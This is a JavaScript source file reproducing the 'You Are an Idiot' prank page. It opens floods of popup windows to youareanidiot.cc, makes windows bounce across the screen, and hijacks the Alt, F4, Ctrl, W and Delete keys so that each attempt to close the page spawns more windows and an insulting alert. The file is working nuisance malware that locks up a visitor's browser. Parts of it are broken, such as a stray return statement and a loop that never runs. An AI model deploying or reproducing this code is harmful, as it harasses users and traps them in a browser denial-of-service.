let window3 = 9

function bookmark() {
    if ((navigator.appName == "Google chrome") 
    && (parseInt(navigator.appVersion) >= 11)) 
    {
    var url="lol.html";
    var title="Idiot!";
    window.external.AddFavorite(url,title);
    }
    }

    var xOff = 5;
    var yOff = 5;
    var xPos = 400;
    var yPos = -100;
    var flagRun = 1;

function changeTitle(title) {
document.title = title;
openWindow("http://youareanidiot.cc/lol.html")
}


function open123() {
    procreate()
    for (i = 0; i < 69; i++) {
        openWindowa("http://youareanidiot.cc/lol.html")
        
        procreate()

    }

}
function myFunction2() {
    procreate()
    for (i = 0; i < 69; i++) {
        openWindow("http://youareanidiot.cc/lol.html")
        procreate()

    }

}




function openWindow(url) {
aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}
function openWindowa(url) {
    aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
    }


function procreate() {
   
        openWindow("http://youareanidiot.cc/lol.html")
        openWindowa("http://youareanidiot.cc")
    }
changeTitle("Idiot!");
openWindowa("http://youareanidiot.cc/lol.html")
for (var i = 0; i < 6; i++) {
    
    
    openWindow('http://youareanidiot.cc')
}


function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are an idiot!"); procreate(); } }
function ctrlwkey() { if (event.keyCode == 17 || event.keyCode == 87) { alert("You are an idiot!"); procreate(); } }
function delkey() { if (event.keyCode == 46) { alert("You are an idiot!"); procreate(); open123() } }
let i = 9
for(i=9;i>10;i++) {
    openWindow("idiot.html")
    return procreate()
}

function newXlt(){
xOff = Math.ceil(-6 * Math.random()) * 5 - 10 ;
window.focus()
openWindow("http://youareanidiot.cc")
}

function newXrt(){
xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
openWindow("http://youareanidiot.cc/lol.html")
}

function newYup(){
yOff = Math.ceil(-6 * Math.random())  * 5 - 10 ;
openWindow("youareanidiot2.html")
}

function newYdn(){
yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
openWindow("http://youareanidiot.cc/lol.html")
}

function fOff(){
flagrun = 0;
openWindow("youareanidiot.html")
}

function playBall() {
xPos += xOff;
yPos += yOff;

if (xPos > screen.width - 357) {
    newXlt();
}

if (xPos < 0){
    newXrt();
}

if (yPos > screen.height - 330) {
    newYup();
}   
    
if (yPos < 0){
    newYdn();
}

if (flagRun == 1){
    window.moveTo(xPos, yPos);
    setTimeout('playBall()', 1);
}
}